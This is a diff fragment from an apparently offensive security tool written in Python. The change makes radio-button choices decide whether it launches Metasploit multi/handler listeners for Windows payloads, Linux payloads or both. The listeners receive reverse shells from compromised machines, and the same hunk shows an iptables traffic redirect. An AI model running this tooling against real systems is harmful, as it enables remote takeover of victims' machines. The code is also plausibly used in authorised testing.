@@ -1826,12 +1826,25 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- WINDOWS
             windows_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Windows)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
             windows_console_string = windows_metapsloit_string % (windows_payload,ip_address,str(port_setting))
-            subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
 
             # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- LINUX
             linux_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Linux)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
             linux_console_string = linux_metapsloit_string % (linux_payload,ip_address,str(int(port_setting) + 1))
-            subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
+
+            if self.respond_to_all_radio.isChecked():
+                subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+                subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
+            elif self.respond_windows_radio.isChecked():
+                subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
+            else:
+                subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
+
+
 
         else:                                                       # If Custom payload is selected as Choice
             progress = 0
